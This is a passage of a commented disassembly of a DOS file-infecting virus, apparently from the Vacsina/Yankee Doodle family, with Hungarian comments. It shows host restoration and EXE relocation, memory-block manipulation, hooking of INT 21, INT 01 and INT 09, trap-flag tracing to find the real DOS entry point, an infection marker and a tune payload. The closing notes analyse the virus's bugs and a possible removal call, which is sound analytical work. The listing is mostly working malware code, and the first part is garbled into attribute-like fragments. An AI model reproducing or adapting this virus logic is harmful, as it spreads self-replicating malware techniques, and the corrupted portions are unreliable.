03e5="" 2e="" cs:="" 03e6="" 8b879afc="" mov="" ax,[bx+fc9a]="" ;ere_ax="" (0028)="" ax="" eredeti="" ‚rt‚ke="" 03ea="" 2e="" cs:="" 03eb="" 8b9f4c03="" mov="" bx,[bx+034c]="" ;ere_2_3="" (06da)="" a="" file="" eredeti="" 2.,3.="" byteja="" +="" 0103="" 03ef="" 81eb0301="" sub="" bx,0103="" ;megkapjuk="" az="" eredeti="" 2.,3.="" byteot="" 03f3="" 2e="" cs:="" 03f4="" 891e0101="" mov="" [0101],bx="" ;vissza ll¡t s="" ;eld”nti,="" hogy="" az="" eredeti="" file="" eredetileg="" exe="" vagy="" com="" volt-e="" (el‚g="" k”rlm‚="" nyesen)="" 03f8="" 2e="" cs:="" 03f9="" 813e00015a4d="" cmp="" word="" ptr="" [0100],4d5a;ha="" a="" file="" exe="" volt="" 040f-en="" folytato="" dik="" 03ff="" 740e="" jz="" 040f="" ;megj.:="" mindegyik="" vacsin ban,="" s”t="" a="" yankee="" doodleban="" 0401="" 2e="" cs:="" ;is="" k‚t="" exe="" k¢dot="" ellen”riz.="" vagy="" va="" l¢ban="" megvan="" ez="" a="" 0402="" 813e00014d5a="" cmp="" word="" ptr="" [0100],5a4d;k‚t="" lehet”s‚g,="" vagy="" az="" ¡r¢="" nem="" tudt="" a="" melyik="" a="" j¢="" !="" 0408="" 7405="" jz="" 040f="" ;="" ha="" a="" file="" eredetileg="" com="" volt="" 0100-ra="" ad¢dik="" a="" vez‚rl‚s="" 040a="" bb0001="" mov="" bx,0100="" 040d="" 53="" push="" bx="" 040e="" c3="" ret="" ;eredeti="" com="" program="" futat sa="" ;---------------------------------------------------------------="" ;="" exe="" filen l="" m‚g="" relok lni="" is="" kell="" !="" ;---------------------------------------------------------------="" ;="" exe="" header-b”l="" kiolvasott="" adatok="" feldolgoz sa="" 040f="" e80000="" *="" call="" 0412="" ;bx="" m r="" elveszett="" 0412="" 5b="" *="" pop="" bx="" ;bx="0412" 0413="" 50="" push="" ax="" ;eredeti="" ax="" meg”rz‚se="" 0414="" 8cc0="" mov="" ax,es="" ;es="cs" 0416="" 051000="" add="" ax,0010="" ;ax="" a="" file(!)="" elej‚re="" mutat="" (es,ds="" m="" ‚g="" nem)="" 0419="" 8b0e0e01="" mov="" cx,[010e]="" ;stack="" t vols ga="" paragrafusban="" (exe="" header-ben)="" 041d="" 03c8="" add="" cx,ax="" ;+="" file="" kezdete="" a="" mem.-ben="" 041f="" 894ffb="" mov="" [bx-05],cx="" ;k¢dra="" menti="" !!!="" 0422="" 8b0e1601="" mov="" cx,[0116]="" ;k¢dterlet="" t vols ga="" paragrafusban="" 0426="" 03c8="" add="" cx,ax="" ;+="" file="" kezdet="" 0428="" 894ff7="" mov="" [bx-09],cx="" ;k¢dra="" menti="" !!!="" 042b="" 8b0e1001="" mov="" cx,[0110]="" ;sp="" kezdeti="" ‚rt‚ke="" 042f="" 894ff9="" mov="" [bx-07],cx="" ;k¢dra="" menti="" !!!="" 0432="" 8b0e1401="" mov="" cx,[0114]="" ;ip="" kezdeti="" ‚rt‚ke="" 0436="" 894ff5="" mov="" [bx-0b],cx="" ;k¢dra="" menti="" !!!="" 0439="" 8b3e1801="" mov="" di,[0118]="" ;els”="" relok ci¢s="" bejegyz‚s="" 043d="" 8b160801="" mov="" dx,[0108]="" ;header="" hossza="" paragrafufban="" 0441="" b104="" mov="" cl,04="" 0443="" d3e2="" shl="" dx,cl="" ;*="" 16="" (nem="" lehet="" t£lcsorg s,="" mert="" a="" file="" hossza=""></fff0><64k) 0445="" 8b0e0601="" mov="" cx,[0106]="" ;relok ci¢s="" t bla="" hossza="" (bejegyz‚sb="" en)="" 0449="" e317="" jcxz="" 0462="" ;ugr s,="" ha="" nincs="" mit="" relok lni="" ;="" relok l s="" ciklusa="" 044b="" 26="" *="" es:="" 044c="" c5b50001="" lds="" si,[di+0100]="" ;k”vetkez”="" relok land¢="" sz¢="" eltol sa="" 0450="" 83c704="" add="" di,+04="" ;k”vetkez”="" relok ci¢s="" bejegyz‚s="" 0453="" 8cdd="" mov="" bp,ds="" 0455="" 26="" es:="" 0456="" 032e0801="" add="" bp,[0108]="" ;header="" hossza="" paragrafusban="" 045a="" 03e8="" add="" bp,ax="" ;ax="a" program="" leend”="" kezdete="" a="" mem.b="" en="" 045c="" 8edd="" mov="" ds,bp="" ;melyik="" szegmensen="" van="" a="" relok land¢="" sz¢="" 045e="" 0104="" add="" [si],ax="" ;relok ci¢="" 0460="" e2e9="" loop="" 044b="" ;ciklus="" cx-szer="" ;="" az="" exe="" program="" val¢di="" hely‚re="" kerl="" a="" mem¢ri ban="" 0462="" 0e="" *="" push="" cs="" 0463="" 1f="" pop="" ds="" ;ds="cs" (es="cs)" 0464="" bf0001="" mov="" di,0100="" 0467="" 8bf2="" mov="" si,dx="" ;si="header" hossza="" byteokban="" 0469="" 81c60001="" add="" si,0100="" ;k¢dterlet="" kezd”c¡me="" 046d="" 8bcb="" mov="" cx,bx="" ;bx="0412" 046f="" 2bce="" sub="" cx,si="" ;ennyi="" byteot="" m soljon="" !="" 0471="" f3="" repz="" ;megj.:="" ez="" egy="" kicsit="" t”bb="" a="" kellet‚="" nel,="" de="" ez="" a="" kuty t="" 0472="" a4="" movsb="" ;sem="" ‚rdekli="" !="" ;="" regiszterek="" kezdeti="" ‚rt‚keinek="" be ll¡t sa,="" a="" program="" futtat sa="" 0473="" 58="" pop="" ax="" ;eredeti="" ax="" 0474="" fa="" cli="" 0475="" 8e57fb="" mov="" ss,[bx-05]="" ;ss:sp="" be ll¡t sa="" 0478="" 8b67f9="" mov="" sp,[bx-07]="" 047b="" fb="" sti="" 047c="" ff6ff5="" jmp="" far="" [bx-0b]="" ;cs:ip="" be ll¡t sa,="" az="" eredeti="" progra="" m="" futtat sa="" ;---------------------------------------------------------------="" ;="" az="" £j="" szegmensen="" itt="" folytat¢dik="" a="" v‚grehajt s="" (03cc-r”l)="" ;---------------------------------------------------------------="" ;az="" eredeti="" programot,="" psp-j‚t="" ‚s="" mem.="" le¡r¢="" blokkj t="" is="" h tr‚bb="" mozgatja="" 047f="" be0000="" *="" mov="" si,0000="" ;megj.:="" a="" k”vetkez”="" k‚t="" utas¡t s="" elh="" agyhat¢="" lenn="" 0482="" bf0000="" mov="" di,0000="" 0485="" 8bcb="" mov="" cx,bx="" ;bx="038E" 0487="" 81c182fc="" add="" cx,fc82="" ;cx="0016" 048b="" 8cc2="" mov="" dx,es="" ;a="" v¡rus="" £j="" szegmense="" 048d="" 4a="" dec="" dx="" 048e="" 8ec2="" mov="" es,dx="" ;es="£j_cs-1" 0490="" 8cda="" mov="" dx,ds="" 0492="" 4a="" dec="" dx="" 0493="" 8eda="" mov="" ds,dx="" ;ds="r‚gi_ds-1" 0495="" 03f1="" add="" si,cx="" ;si="0016" 0497="" 4e="" dec="" si="" 0498="" 8bfe="" mov="" di,si="" ;di="si=0015" 049a="" fd="" std="" 049b="" f3="" repz="" ;r‚gi_ds:0005-="">£j_cs:0005-re 0146 by
						te  tm sol sa
049C A4            MOVSB                    ;visszafel‚ (program+PSP+mem¢riale¡r
						¢ blokk  tm 
049D FC            CLD                      ;Megj.: £j_cs:0000-0005 r‚sz k‚tszer
						 is  tm sol¢


     ;            Mem¢riale¡r¢ blokk  t¡r sa

049E 2E            CS:
049F 8B9775FC      MOV  DX,[BX+FC75]        ;VIR_HOSSZ (0003) v¡rus hossza parag
						rafusokban
04A3 42            INC  DX                  ;dx=006E
04A4 26            ES:
04A5 29160300      SUB  [0003],DX           ;Mem¢riablokk hossz nak cs”kkent‚se
04A9 26            ES:
04AA 8C0E0100      MOV  [0001],CS           ;Gazda az £j_cs


     ;          V¡rus visszam sol sa a r‚gi szegmens elej‚re

04AE BF0000        MOV  DI,0000
04B1 8BF3          MOV  SI,BX               ;bx=038E
04B3 81C672FC      ADD  SI,FC72             ;si=0000 (v¡rus eleje)
04B7 B9E006        MOV  CX,06E0             ;v¡rus hossza (byteben)
04BA 1E            PUSH DS
04BB 07            POP  ES                  ;es=r‚gi_ds-1
04BC 0E            PUSH CS
04BD 1F            POP  DS                  ;ds=£j_cs
04BE F3            REPZ                     ;V¡rus visszam sol sa a szabadd  tet
						t helyre
04BF A4            MOVSB                    ;(PSP-1:0-ra)
04C0 53            PUSH BX


     ;             Az eredeti program £j PSP-t kap

04C1 8CCB          MOV  BX,CS
04C3 B450          MOV  AH,50               ;SET_PSP (bx)
04C5 CD21          INT  21
04C7 5B            POP  BX
04C8 2E            CS:
04C9 8C0E3600      MOV  [0036],CS           ;PSP-n bell a megfelel” bejegyz‚s  
						t¡r sa
					    ;(Nem dokument lt)
04CD 2E            CS:
04CE 8B162C00      MOV  DX,[002C]           ;Environment szegmense
04D2 4A            DEC  DX                  ;Environment mem. le¡r¢ blokkja
04D3 8EC2          MOV  ES,DX
04D5 26            ES:
04D6 8C0E0100      MOV  [0001],CS           ;Tulajdonos az £j PSP
04DA 8CD2          MOV  DX,SS
04DC 4A            DEC  DX
04DD 8EDA          MOV  DS,DX               ;ds=ss-1 Environment v‚ge


     ;        Az INT 21 ‚s az INT 09 lek‚rdez‚se

04DF 53            PUSH BX
04E0 B82135        MOV  AX,3521             ;GET_INT_VECT (es:bx)
04E3 CD21          INT  21
04E5 8C061200      MOV  [0012],ES           ;TISZTA_INT21 (0010)
04E9 891E1000      MOV	[0010],BX
04ED 8C061600      MOV	[0016],ES           ;ERE_INT21 (0014)
04F1 891E1400      MOV	[0014],BX
04F5 B80935        MOV	AX,3509             ;GET_INT_VECT (es:bx)
04F8 CD21          INT	21
04FA 8C061E00      MOV	[001E],ES           ;ERE_INT09 (001C)
04FE 891E1C00      MOV	[001C],BX
0502 5B            POP	BX


     ;             Az INT 21 ellop sa 00A0-ra

0503 B82125        MOV	AX,2521             ;SET_INT_VECT (ds:dx)
0506 BAA000        MOV	DX,00A0
0509 CD21          INT	21


     ;             Az INT 01 ellop sa 0535-re

050B B80125        MOV	AX,2501             ;SET_INT_VECT (ds:dx)
050E BA3505        MOV	DX,0535
0511 CD21          INT	21


     ;Az INT 09 ellop sa 0065-re, s k”zben a DOS val¢di bel‚p‚si pontj nak megke
						res‚se

0513 BA6500        MOV	DX,0065             ;ds:dx-ben az INT 09 leend” c¡me
0516 9C            PUSHF
0517 8BC3          MOV	AX,BX               ;bx=038E
0519 05DC01        ADD	AX,01DC             ;056A Itt fog folytat¢dni a vez‚rl‚s 
						a DOS h¡v s ut n
051C 0E            PUSH	CS
051D 50            PUSH	AX
051E FA            CLI
051F 9C            PUSHF
0520 58            POP	AX
0521 0D0001        OR	AX,0100             ;Trap bit bebillent‚se
0524 50            PUSH	AX
0525 8BC3          MOV	AX,BX               ;bx=038E
0527 05ADFC        ADD	AX,FCAD             ;003B Ide fog ugrani el”sz”r
052A 0E            PUSH	CS
052B 50            PUSH	AX
052C B80925        MOV	AX,2509             ;SET_INT_VECT (ds:dx)
052F C6062A0001    MOV	BYTE PTR [002A],01  ;TRAP_FALG enged‚lyezve
0534 CF            IRET                     ;STACK  llapota:
                                            ;   flag
                                            ;   cs
                                            ;   056A
                                            ;   flag (Trap bit be ll¡tva)
                                            ;   cs
                                            ;   003B   <- sp="" ;igy="" a="" fut s="" cs:003b-n="" folytat¢dik="" l‚p‚senk‚nti="" futtat ssal="" !="" cs:003b-n="" egy="" hossz£="" ugr s="" ;van="" int="" 21="" helyett.="" igy="" a="" dos="" az="" interruptb¢l="" kil‚pve="" cs:056a-ra="" adja="" a="" ve="" z‚rl‚st.="" ;---------------------------------------------------------------="" ;="" int="" 01="" (="" l‚p‚senk‚nti="" futtat s="" )="" ;---------------------------------------------------------------="" ;ha="" nem="" enged‚lyezett="" a="" l‚p‚senk‚nti="" futtat s="" t”rli="" a="" trap="" bitet="" 0535="" 55="" *="" push="" bp="" 0536="" 8bec="" mov="" bp,sp="" 0538="" 2e="" cs:="" 0539="" 803e2a0001="" cmp="" byte="" ptr="" [002a],01="" ;trap_flag="" 053e="" 740d="" jz="" 054d="" ;ugr s,="" ha="" enged‚lyezett="" a="" l‚p‚senk‚nt="" i="" futtat s="" 0540="" 816606fffe="" *="" and="" word="" ptr="" [bp+06],feff="" ;egy‚bk‚nt="" a="" stacken="" t”rli="" a="" trap="" b="" itet="" 0545="" 2e="" cs:="" 0546="" c6062a0000="" mov="" byte="" ptr="" [002a],00="" ;trap_flag="Nem" enged‚lyezett="" a="" l‚p‚="" senk‚nti="" futtat s="" 054b="" 5d="" pop="" bp="" 054c="" cf="" iret="" ;ha="" h¡v¢_cs="">=0300 akkor semmit sem csin l (m‚g nem jutott el a DOS-ig)

054D 817E040003  * CMP	WORD PTR [BP+04],0300 ;cs ‚rt‚ke a stacken (honnan h¡vt k
						 az INT 01-et)
0552 7202          JB	0556
0554 5D            POP	BP
0555 CF            IRET


     ;  Megtal lta a DOS val¢di bel‚p‚si pontj t (h¡v¢_cs<0300) 0556="" 53="" *="" push="" bx="" 0557="" 8b5e02="" mov="" bx,[bp+02]="" ;h¡v¢_ip="" 055a="" 2e="" cs:="" 055b="" 891e1400="" mov="" [0014],bx="" ;tiszta_int21-en="" bell="" az="" offset="" 055f="" 8b5e04="" mov="" bx,[bp+04]="" ;h¡v¢_cs="" 0562="" 2e="" cs:="" 0563="" 891e1600="" mov="" [0016],bx="" ;tiszta_int21-en="" bell="" a="" szegmens="" 0567="" 5b="" pop="" bx="" 0568="" ebd6="" jmp="" 0540="" ;visszat‚r‚s="" "nem="" kell="" t”bb="" l‚p‚senk‚nti="" futt="" at s"="" jelz‚ssel="" ;---------------------------------------------------------------="" ;="" a="" dos="" l‚p‚senk‚nti="" futtat sa="" ut n="" ide="" t‚r="" vissza="" (0534-r”l)="" ;---------------------------------------------------------------="" ;="" a="" g‚p="" fert”z”tt="" jelz‚s="" elhelyez‚se="" a="" kor bbi="" vacsin knak="" 056a="" c6062a0000="" *="" mov="" byte="" ptr="" [002a],00="" ;trap_flag="nem" kell="" l‚p‚senk‚nti="" fu="" ttat s="" 056f="" b80000="" mov="" ax,0000="" 0572="" 8ec0="" mov="" es,ax="" ;es="0" 0574="" 26="" es:="" 0575="" c706c5007f39="" mov="" word="" ptr="" [00c5],397f;int="" 31="" vektor nak="" 2.,3.="" byteja="" (nem="" dokument lt="" dos="" ;interrupt,="" val¢sz¡nleg="" csak="" az="" els="" ”="" byteot="" haszn lja="" ;a="" dos).="" 397f="" egy="" ellen”rz”="" sz¢.="" a="" k="" or bbi="" verzi¢j£="" ;vacsin knak="" sz¢l.="" jelent‚se:="" a="" g‚p="" m r="" fert”z”tt.="" 057b="" 26="" es:="" 057c="" c606c70018="" mov="" byte="" ptr="" [00c7],18="" ;verzi¢sz m="" (melyik="" vacsina="" van="" a="" mem="" ¢ri ban)="" ;="" dta=""  t ll¡t sa="" ‚s="" az="" eredeti="" program="" futtat sa="" 0581="" 8cc8="" mov="" ax,cs="" 0583="" 8ed8="" mov="" ds,ax="" 0585="" b41a="" mov="" ah,1a="" ;set_dta_address="" 0587="" ba5000="" mov="" dx,0050="" ;hiba="" !!!="" a="" dta-nak="" cs:0080-ra="" kellene="" mutatni="" a="" 058a="" cd21="" int="" 21="" ;megj.:val¢sz¡nleg="" lehagyta="" az="" ¡r¢="" a="" 'h'-t="" a="" sz m="" 058c="" 2e="" cs:="" ;v‚g‚r”l,="" ugyanis="" 80d="50H" 058d="" 8b879afc="" mov="" ax,[bx+fc9a]="" ;ere_ax="" (0028)="" megj.:="" teljesen="" feles="" leges="" 0591="" e939fe="" jmp="" 03cd="" ;ugr s="" az="" eredeti="" program="" futtat s ra="" ;---------------------------------------------------------------="" ;="" k‚sleltet‚s="" ;---------------------------------------------------------------="" ;="" bx="k‚sleltet‚s" 0.01="" mp-ben="" 0594="" 50="" *="" push="" ax="" 0595="" 53="" push="" bx="" 0596="" 51="" push="" cx="" 0597="" 52="" push="" dx="" 0598="" b42c="" mov="" ah,2c="" ;get_time="" (cx:dx)="" 059a="" cd21="" int="" 21="" ;ll¡t¢lag="" al-ben="" a="" h‚t="" napj t="" adja="" v="" issza="" !="" 059c="" 8ae5="" mov="" ah,ch="" 059e="" 02c1="" add="" al,cl="" 05a0="" 02fe="" add="" bh,dh="" 05a2="" 02da="" add="" bl,dl="" ;meddig="" kell="" zen‚lni="" (id”pont)="" 05a4="" 80fb64="" cmp="" bl,64="" ;100d="" sz zadm sodperc="" 05a7="" 7205="" jb="" 05ae="" ;ok="" 05a9="" 80eb64="" sub="" bl,64="" ;t£lcsorg sn l="" 05ac="" fec7="" inc="" bh="" 05ae="" 80ff3c="" *="" cmp="" bh,3c="" ;60="" mp="" 05b1="" 7205="" jb="" 05b8="" ;ok="" 05b3="" 80ef3c="" sub="" bh,3c="" ;t£lcsorg sn l="" 05b6="" fec0="" inc="" al="" 05b8="" 3c3c="" *="" cmp="" al,3c="" ;60="" perc="" 05ba="" 7204="" jb="" 05c0="" ;ok="" 05bc="" 2c3c="" sub="" al,3c="" ;t£lcsorg sn l="" 05be="" fec4="" inc="" ah="" 05c0="" 80fc18="" *="" cmp="" ah,18="" ;24="" ¢ra="" 05c3="" 7502="" jnz="" 05c7="" ;ok="" 05c5="" 2ae4="" sub="" ah,ah="" ;t£lcsorg sn l="" 05c7="" 50="" *="" push="" ax="" ;ciklus="" am¡g="" el‚rjk="" a="" kijel”lt="" id”p="" ontot="" 05c8="" b42c="" mov="" ah,2c="" 05ca="" cd21="" int="" 21="" 05cc="" 58="" pop="" ax="" 05cd="" 3bc8="" cmp="" cx,ax="" 05cf="" 7706="" ja="" 05d7="" 05d1="" 72f4="" jb="" 05c7="" 05d3="" 3bd3="" cmp="" dx,bx="" 05d5="" 72f0="" jb="" 05c7="" 05d7="" 5a="" *="" pop="" dx="" ;k‚sleltet‚s="" v‚ge="" 05d8="" 59="" pop="" cx="" 05d9="" 5b="" pop="" bx="" 05da="" 58="" pop="" ax="" 05db="" c3="" ret="" ;---------------------------------------------------------------="" ;="" egy="" hang="" megsz¢laltat sa="" ;---------------------------------------------------------------="" ;="" di="hangmagass g" ;="" bl="hanghossz" ;="" cl="0" ;="" bh="0" 05dc="" 50="" *="" push="" ax="" 05dd="" 51="" push="" cx="" 05de="" 52="" push="" dx="" 05df="" 57="" push="" di="" 05e0="" b0b6="" mov="" al,b6="" ;(10110110)="" 3.="" zemm¢d,="" 2.="" csatorna,="" alacsonyabb-="" magasabb="" sorrend="" 05e2="" e643="" out="" 43,al="" ;timer="" programoz sa="" 05e4="" ba1400="" mov="" dx,0014="" 05e7="" b88032="" mov="" ax,3280="" ;dx:ax="1323648D" 05ea="" f7f7="" div="" di="" ;osztva="" a="" hangmagass ggal="" 05ec="" e642="" out="" 42,al="" ;als¢="" byte="" 05ee="" 8ac4="" mov="" al,ah="" 05f0="" e642="" out="" 42,al="" ;fels”="" byte="" elkld‚se="" 05f2="" e461="" in="" al,61="" 05f4="" 8ae0="" mov="" ah,al="" 05f6="" 0c03="" or="" al,03="" ;timer="" enged‚lyez‚se,="" hangsz¢r¢="" be="" 05f8="" e661="" out="" 61,al="" 05fa="" 8ac1="" mov="" al,cl="" ;cl="0" 05fc="" e895ff="" call="" 0594="" ;k‚sleltet‚s="" 05ff="" 8ac4="" mov="" al,ah="" 0601="" e661="" out="" 61,al="" ;hangsz¢r¢="" kikapcs.="" 0603="" 5f="" pop="" di="" 0604="" 5a="" pop="" dx="" 0605="" 59="" pop="" cx="" 0606="" 58="" pop="" ax="" 0607="" c3="" ret="" ;---------------------------------------------------------------="" ;="" a="" megadott="" dallam="" elj tsz sa="" ;---------------------------------------------------------------="" 0608="" 8b3c="" *="" mov="" di,[si]="" 060a="" 83ffff="" cmp="" di,-01="" ;v‚ge="" 060d="" 7411="" jz="" 0620="" ;-=""> ret
060F 3E            DS:
0610 8A5E00        MOV	BL,[BP+00]          ;Hanghossz
0613 2AC9          SUB	CL,CL               ;CL=0
0615 2AFF          SUB	BH,BH               ;BH=0
0617 E8C2FF        CALL	05DC                ;Egy hang megsz¢laltat sa
061A 83C602        ADD	SI,+02              ;K”vetkez” hang
061D 45            INC	BP
061E 75E8          JNZ	0608
0620 C3          * RET


     ;---------------------------------------------------------------
     ;                Zen‚l” r‚sz ( INT 09 h¡vja )
     ;---------------------------------------------------------------

0621 BE2B06      * MOV	SI,062B             ;SI a "hangmagass gok" t bl zat ra mu
						tat
0624 BD9F06        MOV	BP,069F             ;BP a "hanghosszok" t bl zat ra mutat
0627 E8DEFF        CALL	0608
062A C3            RET


     ;---------------------------------------------------------------
     ;              Hangmagass gok t bl zata (062B-069E)
     ;---------------------------------------------------------------

062B 06            PUSH	ES
062C 01060125      ADD	[2501],AX
0630 014901        ADD	[BX+DI+01],CX
0633 06            PUSH	ES
0634 014901        ADD	[BX+DI+01],CX
0637 2501C4        AND	AX,C401
063A 00060106      ADD	[0601],AL
063E 0125          ADD	[DI],SP
0640 014901        ADD	[BX+DI+01],CX
0643 06            PUSH	ES
0644 01060106      ADD	[0601],AX
0648 01060125      ADD	[2501],AX
064C 014901        ADD	[BX+DI+01],CX
064F 5D            POP	BP
0650 014901        ADD	[BX+DI+01],CX
0653 250106        AND	AX,0601
0656 01F6          ADD	SI,SI
0658 00C4          ADD	AH,AL
065A 00DC          ADD	AH,BL
065C 00F6          ADD	DH,DH
065E 00060106      ADD	[0601],AL
0662 01DC          ADD	SP,BX
0664 00F6          ADD	DH,DH
0666 00DC          ADD	AH,BL
0668 00AE00DC      ADD	[BP+DC00],CH
066C 00F6          ADD	DH,DH
066E 000601DC      ADD	[DC01],AL
0672 00C4          ADD	AH,AL
0674 00DC          ADD	AH,BL
0676 00C4          ADD	AH,AL
0678 00AE00A4      ADD	[BP+A400],CH
067C 00AE00C4      ADD	[BP+C400],CH
0680 00DC          ADD	AH,BL
0682 00F6          ADD	DH,DH
0684 00DC          ADD	AH,BL
0686 00AE00DC      ADD	[BP+DC00],CH
068A 00F6          ADD	DH,DH
068C 000601DC      ADD	[DC01],AL
0690 00C4          ADD	AH,AL
0692 000601F6      ADD	[F601],AL
0696 0025          ADD	[DI],AH
0698 01060106      ADD	[0601],AX
069C 01FF          ADD	DI,DI
069E FF


     ;---------------------------------------------------------------
     ;               Hanghosszok t bl zata (069F-06D7)
     ;---------------------------------------------------------------


069F 19            CALL	FAR [BX+DI]
06A0 1919          SBB	[BX+DI],BX
06A2 1919          SBB	[BX+DI],BX
06A4 1919          SBB	[BX+DI],BX
06A6 1919          SBB	[BX+DI],BX
06A8 1919          SBB	[BX+DI],BX
06AA 1932          SBB	[BP+SI],SI
06AC 3219          XOR	BL,[BX+DI]
06AE 1919          SBB	[BX+DI],BX
06B0 1919          SBB	[BX+DI],BX
06B2 1919          SBB	[BX+DI],BX
06B4 1919          SBB	[BX+DI],BX
06B6 1919          SBB	[BX+DI],BX
06B8 1932          SBB	[BP+SI],SI
06BA 321A          XOR	BL,[BP+SI]
06BC 191A          SBB	[BP+SI],BX
06BE 1919          SBB	[BX+DI],BX
06C0 1919          SBB	[BX+DI],BX
06C2 191A          SBB	[BP+SI],BX
06C4 191A          SBB	[BP+SI],BX
06C6 1919          SBB	[BX+DI],BX
06C8 191E1A19      SBB	[191A],BX
06CC 1A19          SBB	BL,[BX+DI]
06CE 1919          SBB	[BX+DI],BX
06D0 191E1919      SBB	[1919],BX
06D4 1919          SBB	[BX+DI],BX
06D6 3232          XOR	DH,[BP+SI]


     ;---------------------------------------------------------------
     ;         Az utols¢ 8 byte a v¡rus felismer‚s‚t szolg lja
     ;---------------------------------------------------------------

06D8 ERE_HOSSZ     DW   ?         ;A file eredeti hossza
06DA ERE_2_3       DW   ?         ;Eredeti 2.,3. byte + 0103
06DC AZONOSITO     DW   7AF4      ;Ez alapj n ismeri fel a fert”z‚st
06DD VERZIO        DB   18        ;Verzi¢sz m
06DF ERE_1         DB   ?         ;Eredeti els” byte
     ;Megj.: Ez az utols¢ 8 byte mindegyik Vacsin n l (s”t a Yankee Doodlen l is
						) ¡gy n‚z ki,
     ;kiv‚tel a 9-es verzi¢n l kor bbiakat, ott ugyanis az eredeti els” byteot n
						em kell menteni
     ;( mivel csak JMP-pal kezd”d” fileokat fert”znek ).

     ;--------------------------------------------------------------
     ;                       File, v¡rus v‚ge
     ;--------------------------------------------------------------



Megjegyz‚sek:

- A v¡rus "verzi¢sz m nak" bevezet‚se ”nk‚nyes. Egy bizonyos verzi¢ felett m r v
						al¢sz¡nleg csak a
  p ros sz mokat haszn lta az ¡r¢, ¡gy egy v¡rusnak (a VEZERLO-t”l fgg”en) k‚t 
						verzi¢ja is lehet.
  Tal n a v¡rus ki¡rt s hoz haszn lhat¢.
  Pl:    mov   cl,2
         mov   ax,C502    ;VEZERLO megv ltoztat sa
         int   21
         mov   ds,file_nev_szegmense
         mov   dx,offset file_nev
         mov   ax,4B00
         int   21

- A Yankee Doodle-b¢l kiderl, hogy 34-esn‚l nagyobb verzi¢sz m m r Yankee Doodl
						e ‚s nem Vacsina.
  Egy‚bk‚nt a k‚t v¡rusdinasztia ugyanaz, val¢sz¡nleg ugyanaz a szem‚ly ¡rta.

- A C5-”s DOS alfunkci¢h¡v s miatt val¢sz¡nleg Novellben nem fut (az CF-fel, hi
						b val t‚r vissza
  ¡gy a v¡rus m r azt hiszi, hogy bent van a mem¢ri ban).

- A Yankee Doodleben van egy hiba a C603-as funkci¢n l.Ebben a v¡rusban ez m‚g v
						agy m r nincs benn.
  Nem tudom ez mit jelenthet.

- A Peth” k”nyv szerint a 2C DOS funkci¢  ll¡tja AL-t. A v¡rusk¢d pedig ezt nem 
						figyeli! (059A-n l)

- A v¡rus a DTA-t rossz helyre  ll¡tja (ds:0050-re a ds:0080 helyett). Ez val¢sz
						¡nleg az‚rt van,
  mert az assembly list ban a 80 ut n lemaradt a 'H'.

</0300)></-></64k)></del>